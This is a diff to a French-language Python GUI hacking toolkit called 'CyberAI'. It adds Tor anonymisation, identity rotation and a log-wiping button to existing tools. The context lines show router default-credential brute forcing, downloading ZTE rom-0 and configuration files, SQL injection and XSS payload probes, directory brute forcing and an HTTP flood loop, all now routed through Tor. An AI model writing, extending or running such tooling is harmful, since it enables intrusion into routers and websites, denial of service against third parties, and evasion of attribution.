@@ -6,6 +6,8 @@ import threading
 import time
 import json
 import subprocess
+import random
+import string
 import requests
 import whois
 from datetime import datetime
@@ -57,6 +59,72 @@ def resolve_target(target):
         return target
 
 
+# ──────────────────────── GESTIONNAIRE TOR ────────────────────────
+class TorManager:
+    def __init__(self, app):
+        self.app = app
+        self.enabled = False
+        self.socks_port = 9050
+        self.control_port = 9051
+        self.password = ""
+        self.current_ip = "Inconnu"
+        self.status_text = "D\u00e9sactiv\u00e9"
+
+    def is_tor_running(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect(("127.0.0.1", self.socks_port))
+            s.close()
+            return True
+        except:
+            return False
+
+    def check_ip(self):
+        try:
+            proxies = self.app.session.proxies if self.enabled else {}
+            r = self.app.session.get("https://api.ipify.org?format=json", proxies=proxies, timeout=8)
+            self.current_ip = r.json().get("ip", "Inconnu")
+            return self.current_ip
+        except:
+            self.current_ip = "Erreur"
+            return "Erreur"
+
+    def enable(self):
+        if not self.is_tor_running():
+            return False, "Tor n'est pas en cours d'ex\u00e9cution."
+        self.app.session.proxies.update({
+            "http": f"socks5h://127.0.0.1:{self.socks_port}",
+            "https": f"socks5h://127.0.0.1:{self.socks_port}",
+        })
+        self.enabled = True
+        self.status_text = "Activ\u00e9"
+        ip = self.check_ip()
+        return True, f"Tor activ\u00e9. IP: {ip}"
+
+    def disable(self):
+        self.app.session.proxies = {}
+        self.enabled = False
+        self.status_text = "D\u00e9sactiv\u00e9"
+        self.current_ip = "Inconnu"
+        return True, "Tor d\u00e9sactiv\u00e9."
+
+    def new_identity(self):
+        try:
+            from stem import Signal
+            from stem.control import Controller
+            with Controller.from_port(port=self.control_port) as ctrl:
+                ctrl.authenticate(password=self.password)
+                ctrl.signal(Signal.NEWNYM)
+            time.sleep(2)
+            ip = self.check_ip()
+            return True, f"Nouvelle identit\u00e9 Tor: {ip}"
+        except ImportError:
+            return False, "Module 'stem' non install\u00e9."
+        except Exception as e:
+            return False, f"Erreur changement d'identit\u00e9: {e}"
+
+
 # ──────────────────────── FENÊTRE PRINCIPALE ────────────────────────
 class CyberAI(tk.Tk):
     def __init__(self):
@@ -73,24 +141,46 @@ class CyberAI(tk.Tk):
         style.configure("Error.TLabel", foreground="red", font=("TkDefaultFont", 10, "bold"))
         style.configure("Warning.TLabel", foreground="orange", font=("TkDefaultFont", 10))
 
-        notebook = ttk.Notebook(self)
-        notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
+        self.session = requests.Session()
+        self.tor = TorManager(self)
 
-        tabs = {
+        notebook = ttk.Notebook(self)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=(8, 0))
+
+        self.tabs = {}
+        tab_classes = {
             " Network ":   NetworkTab,
             " Router ":    RouterTab,
             " Web ":       WebTab,
             " OSINT ":     OSINTTab,
             " Password ":  PasswordTab,
             " DoS ":       DoSTab,
+            " Anonymity " : AnonymityTab,
         }
 
-        for name, cls in tabs.items():
+        for name, cls in tab_classes.items():
             frame = ttk.Frame(notebook)
             notebook.add(frame, text=name)
-            cls(frame, self)
+            self.tabs[cls] = cls(frame, self)
+
+        self.status_bar = ttk.Frame(self)
+        self.status_bar.pack(fill=tk.X, padx=8, pady=(2, 6))
+        self.tor_indicator = ttk.Label(self.status_bar, text="\u25cf Tor: D\u00e9sactiv\u00e9", foreground="gray")
+        self.tor_indicator.pack(side=tk.LEFT, padx=5)
+        self.ip_indicator = ttk.Label(self.status_bar, text="IP: ---")
+        self.ip_indicator.pack(side=tk.LEFT, padx=5)
+        ttk.Label(self.status_bar, text="CyberAI v2.0", foreground="gray").pack(side=tk.RIGHT, padx=5)
 
         self.protocol("WM_DELETE_WINDOW", self._on_close)
+
+    def update_tor_status(self):
+        if self.tor.enabled:
+            self.tor_indicator.config(text="\u25cf Tor: Activ\u00e9", foreground="green")
+            self.ip_indicator.config(text=f"IP: {self.tor.current_ip}")
+        else:
+            self.tor_indicator.config(text="\u25cf Tor: D\u00e9sactiv\u00e9", foreground="gray")
+            self.ip_indicator.config(text="IP: ---")
+        self.update_idletasks()
 
     def _on_close(self):
         self.destroy()
@@ -241,7 +331,7 @@ class NetworkTab(BaseTab):
     def do_mac_lookup(self, mac):
         self.log(self.output, f"Recherche du fabricant pour {mac}...", "bold")
         try:
-            r = requests.get(f"https://api.macvendors.com/{mac}", timeout=8)
+            r = self.app.session.get(f"https://api.macvendors.com/{mac}", timeout=8)
             if r.status_code == 200:
                 self.log(self.output, f"  Fabricant: {r.text.strip()}", "success")
             else:
@@ -256,11 +346,11 @@ class NetworkTab(BaseTab):
     def do_my_ip(self):
         self.log(self.output, "Recherche de votre IP publique...", "bold")
         try:
-            r = requests.get("https://api.ipify.org?format=json", timeout=8)
+            r = self.app.session.get("https://api.ipify.org?format=json", timeout=8)
             ip = r.json().get("ip", "inconnue")
             self.log(self.output, f"  IP publique: {ip}", "success")
             try:
-                r2 = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
+                r2 = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
                 data = r2.json()
                 if data.get("status") == "success":
                     self.log(self.output, f"  FAI: {data.get('isp', 'N/A')}")
@@ -347,7 +437,7 @@ class RouterTab(BaseTab):
         for user, pwd in creds:
             try:
                 if port == 80:
-                    r = requests.get(f"http://{ip}:{port}/", auth=(user, pwd), timeout=5, verify=False)
+                    r = self.app.session.get(f"http://{ip}:{port}/", auth=(user, pwd), timeout=5, verify=False)
                     if r.status_code == 200:
                         self.log(self.output, f"[HTTP] {user}:{pwd} \u2192 OK", "success")
                 elif port == 22:
@@ -383,7 +473,7 @@ class RouterTab(BaseTab):
     def do_rom0(self, ip, port):
         self.log(self.output, "T\u00e9l\u00e9chargement rom-0 (ZTE)...", "bold")
         try:
-            r = requests.get(f"http://{ip}:{port}/rom-0", timeout=10, verify=False)
+            r = self.app.session.get(f"http://{ip}:{port}/rom-0", timeout=10, verify=False)
             if r.status_code == 200 and len(r.content) > 100:
                 fname = f"rom0_{ip}.bin"
                 with open(fname, "wb") as f:
@@ -411,7 +501,7 @@ class RouterTab(BaseTab):
         ]
         for path in urls:
             try:
-                r = requests.get(f"http://{ip}:{port}{path}", timeout=10, verify=False)
+                r = self.app.session.get(f"http://{ip}:{port}{path}", timeout=10, verify=False)
                 if r.status_code == 200 and len(r.content) > 50:
                     safe = path.replace("/", "_")
                     fname = f"config_{ip}{safe}"
@@ -470,7 +560,7 @@ class WebTab(BaseTab):
     def do_headers(self, url):
         self.log(self.output, f"Analyse des headers: {url}", "bold")
         try:
-            r = requests.get(url, timeout=10, verify=False)
+            r = self.app.session.get(url, timeout=10, verify=False)
             self.log(self.output, f"Status: {r.status_code}", "bold")
             for k, v in r.headers.items():
                 tag = None
@@ -501,7 +591,7 @@ class WebTab(BaseTab):
         errors = ["sql", "mysql", "syntax error", "unclosed", "quotation mark", "ODBC", "SQLite"]
         for p in payloads:
             try:
-                r = requests.get(url + p, timeout=5, verify=False)
+                r = self.app.session.get(url + p, timeout=5, verify=False)
                 for e in errors:
                     if e.lower() in r.text.lower():
                         self.log(self.output, f"  [!] Possible SQLi avec: {p}", "error")
@@ -522,7 +612,7 @@ class WebTab(BaseTab):
         payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
         for p in payloads:
             try:
-                r = requests.get(url + p, timeout=5, verify=False)
+                r = self.app.session.get(url + p, timeout=5, verify=False)
                 if p in r.text:
                     self.log(self.output, f"  [!] XSS r\u00e9fl\u00e9chie avec: {p[:40]}", "error")
                 else:
@@ -585,7 +675,7 @@ class WebTab(BaseTab):
         found = 0
         for d in common:
             try:
-                r = requests.get(f"{base}/{d}", timeout=5, verify=False, allow_redirects=False)
+                r = self.app.session.get(f"{base}/{d}", timeout=5, verify=False, allow_redirects=False)
                 if r.status_code in (200, 301, 302, 403):
                     self.log(self.output, f"  [{r.status_code}] /{d}", "warning" if r.status_code != 403 else "success")
                     found += 1
@@ -744,7 +834,7 @@ class OSINTTab(BaseTab):
                 self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")
         self.log(self.output, "\n[HTTP]")
         try:
-            r = requests.get(f"http://{ip}", timeout=5, verify=False)
+            r = self.app.session.get(f"http://{ip}", timeout=5, verify=False)
             self.log(self.output, f"  Status: {r.status_code}")
             self.log(self.output, f"  Server: {r.headers.get('Server', 'N/A')}")
         except:
@@ -794,7 +884,7 @@ class OSINTTab(BaseTab):
         ip = resolve_target(t)
         self.log(self.output, f"G\u00e9olocalisation pour {ip}:", "bold")
         try:
-            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
+            r = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
             if r.status_code == 200:
                 data = r.json()
                 if data.get("status") == "success":
@@ -1124,7 +1214,7 @@ class DoSTab(BaseTab):
         def worker():
             while not self.stop_flag.is_set():
                 try:
-                    requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
+                    self.app.session.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                     with lock:
                         stats["sent"] += 1
                 except:
@@ -1152,6 +1242,132 @@ class DoSTab(BaseTab):
         self.stop_flag.set()
         self.btn_start.config(state=tk.NORMAL)
         self.btn_stop.config(state=tk.DISABLED)
+
+
+# ════════════════════════ 7. ANONYMITY / TOR ════════════════════════
+class AnonymityTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        f = ttk.LabelFrame(main, text="Contr\u00f4le Tor / Anonymat")
+        f.pack(fill=tk.X, pady=(0, 8))
+
+        self.btn_tor = ttk.Button(f, text="Activer Tor", command=self.toggle_tor, width=20)
+        self.btn_tor.grid(row=0, column=0, padx=10, pady=8)
+
+        info_frame = ttk.Frame(f)
+        info_frame.grid(row=0, column=1, padx=10, pady=8, sticky="w")
+        self.lbl_status = ttk.Label(info_frame, text="Status: D\u00e9sactiv\u00e9", font=("TkDefaultFont", 10))
+        self.lbl_status.pack(anchor="w")
+        self.lbl_ip = ttk.Label(info_frame, text="IP: ---", font=("TkDefaultFont", 10, "bold"))
+        self.lbl_ip.pack(anchor="w")
+
+        ctrl_frame = ttk.Frame(f)
+        ctrl_frame.grid(row=1, column=0, columnspan=2, pady=(0, 8))
+        ttk.Button(ctrl_frame, text="Nouvelle Identit\u00e9 Tor", command=self.run_new_id, width=22).pack(side=tk.LEFT, padx=5)
+        ttk.Button(ctrl_frame, text="V\u00e9rifier IP", command=self.run_check_ip, width=15).pack(side=tk.LEFT, padx=5)
+        ttk.Button(ctrl_frame, text="Wipe All Logs", command=self.run_wipe, width=15).pack(side=tk.LEFT, padx=5)
+
+        sec = ttk.LabelFrame(main, text="Param\u00e8tres Proxy")
+        sec.pack(fill=tk.X, pady=(0, 8))
+        ttk.Label(sec, text="SOCKS Port:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
+        self.entry_socks = ttk.Entry(sec, width=8)
+        self.entry_socks.insert(0, "9050")
+        self.entry_socks.grid(row=0, column=1, padx=5, pady=5, sticky="w")
+        ttk.Label(sec, text="Control Port:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
+        self.entry_ctrl = ttk.Entry(sec, width=8)
+        self.entry_ctrl.insert(0, "9051")
+        self.entry_ctrl.grid(row=0, column=3, padx=5, pady=5, sticky="w")
+        ttk.Label(sec, text="Password:").grid(row=0, column=4, padx=5, pady=5, sticky="w")
+        self.entry_pass = ttk.Entry(sec, width=15, show="*")
+        self.entry_pass.grid(row=0, column=5, padx=5, pady=5, sticky="w")
+        ttk.Button(sec, text="Appliquer", command=self.apply_settings, width=10).grid(row=0, column=6, padx=5)
+
+        info = ttk.LabelFrame(main, text="Informations")
+        info.pack(fill=tk.X, pady=(0, 8))
+        ttk.Label(info, text=(
+            "Tor doit \u00eatre install\u00e9 et le service lanc\u00e9.\n"
+            "  - Installation: sudo apt install tor\n"
+            "  - D\u00e9marrer: sudo systemctl start tor\n"
+            "  - Pour NEWNYM: d\u00e9commenter 'ControlPort 9051' dans /etc/tor/torrc\n"
+            "  - Cookie auth par d\u00e9faut (laissez password vide)"
+        ), foreground="gray", wraplength=700).pack(padx=10, pady=10, anchor="w")
+
+        self.output = self.make_output(main)
+
+    def toggle_tor(self):
+        if self.app.tor.enabled:
+            success, msg = self.app.tor.disable()
+            self.btn_tor.config(text="Activer Tor")
+            self.lbl_status.config(text="Status: D\u00e9sactiv\u00e9", foreground="black")
+        else:
+            self.apply_settings()
+            success, msg = self.app.tor.enable()
+            if success:
+                self.btn_tor.config(text="D\u00e9sactiver Tor")
+                self.lbl_status.config(text=f"Status: Activ\u00e9", foreground="green")
+                self.lbl_ip.config(text=f"IP: {self.app.tor.current_ip}")
+            else:
+                messagebox.showerror("Erreur", msg)
+        self.app.update_tor_status()
+
+    def run_new_id(self):
+        self.run_thread(lambda: self.do_new_id())
+
+    def do_new_id(self):
+        self.log(self.output, "Changement d'identit\u00e9 Tor...", "bold")
+        success, msg = self.app.tor.new_identity()
+        self.log(self.output, msg, "success" if success else "error")
+        if success:
+            self.lbl_ip.config(text=f"IP: {self.app.tor.current_ip}")
+        else:
+            self.log(self.output, "Astuce: d\u00e9commentez ControlPort 9051 dans /etc/tor/torrc", "warning")
+        self.app.update_tor_status()
+
+    def run_check_ip(self):
+        self.run_thread(lambda: self.do_check_ip())
+
+    def do_check_ip(self):
+        self.log(self.output, "V\u00e9rification de l'IP...", "bold")
+        try:
+            r = self.app.session.get("https://api.ipify.org?format=json", timeout=8)
+            ip = r.json().get("ip", "Inconnu")
+            self.log(self.output, f"  IP actuelle: {ip}", "success")
+            self.lbl_ip.config(text=f"IP: {ip}")
+            try:
+                r2 = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
+                data = r2.json()
+                if data.get("status") == "success":
+                    self.log(self.output, f"  Pays: {data.get('country', 'N/A')}")
+                    self.log(self.output, f"  ISP: {data.get('isp', 'N/A')}")
+            except:
+                pass
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+        self.app.update_tor_status()
+
+    def run_wipe(self):
+        for tab in self.app.tabs.values():
+            if hasattr(tab, "output"):
+                self.clear(tab.output)
+        self.log(self.output, "Tous les logs ont \u00e9t\u00e9 effac\u00e9s.", "success")
+        self.log(self.output, "Aucune trace locale conserv\u00e9e.", "success")
+
+    def apply_settings(self):
+        try:
+            self.app.tor.socks_port = int(self.entry_socks.get().strip())
+            self.app.tor.control_port = int(self.entry_ctrl.get().strip())
+            self.app.tor.password = self.entry_pass.get().strip()
+            if self.app.tor.enabled:
+                self.app.tor.disable()
+                self.app.tor.enable()
+        except ValueError:
+            messagebox.showerror("Erreur", "Ports invalides.")
 
 
 # ════════════════════════ MAIN ════════════════════════
